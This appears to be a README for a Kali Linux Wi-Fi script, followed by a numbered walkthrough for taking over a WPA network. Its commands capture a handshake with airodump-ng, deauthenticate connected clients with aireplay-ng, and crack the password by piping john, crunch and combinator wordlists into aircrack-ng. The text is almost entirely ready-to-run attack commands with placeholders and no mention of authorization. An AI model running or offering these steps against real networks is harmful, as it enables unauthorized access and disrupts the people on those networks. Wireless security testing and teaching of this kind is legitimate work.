# kali_wifi_setup_script
A basic script to bring a wlan0 interface up to monitor mode and start airodump-ng if required

Route to capture wpa handshake

1: use the above output to decide on target and note details:
```
BSSID:     00:00:00:00:22:30
ESSID:     TESTAP
Client:    00:00:00:00:00:ED
Mon0:      00:00:00:00:00:A8
Channel:   11
```
2: Screen 1 - Monitor target for clients using: ```airodump-ng -c <Channel> --bssid <BSSID> -w <CaptureName> <Mon0 interface name>```
  
3: Screen 2 - Associate with the bssid: ```aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your Mon0 MAC> <Mon0 interface name>```
  
4: Screen 3 - death a connected client periodically until the wpa handshake is witnessed / captured in screen 1 
  ```aireplay-ng -0 1 -a <AP MAC> -c <Client MAC to DeAuth> <Mon0 interface name>```
  
5: Go get a life and hope that you can attack the wifi handshake captured

```john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout | aircrack-ng -0 -e "THEAPANAME" -w - /SOMEPATH/THECAPTURENAME.cap```

6: If you know a pattern for the wifi password then try the following items?

```crunch 8 8 abcdef1234567890 | aircrack-ng -0 -e "THEAPANAME" -w - /SOMEPATH/THECAPTURENAME.cap
crunch 8 8 abcdefghijklmnopqrstuvqxyz | aircrack-ng -0 -e "THEAPANAME" -w - /SOMEPATH/THECAPTURENAME.cap
```

7: Failing all the above and if you have a powerful enough GPU GTX 1080 :D then try combinations of words such as:
```/usr/lib/hashcat-utils/combinator.bin /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt  |aircrack-ng -0 -e "THEAPANAME" -w - SOMEPATH/THECAPTURENAME.cap```


All of the above may produce 0 results and take a looong time to do so, however if weak words, patterns or weak words joined are used then the above will yield a result eventually......maybe......?
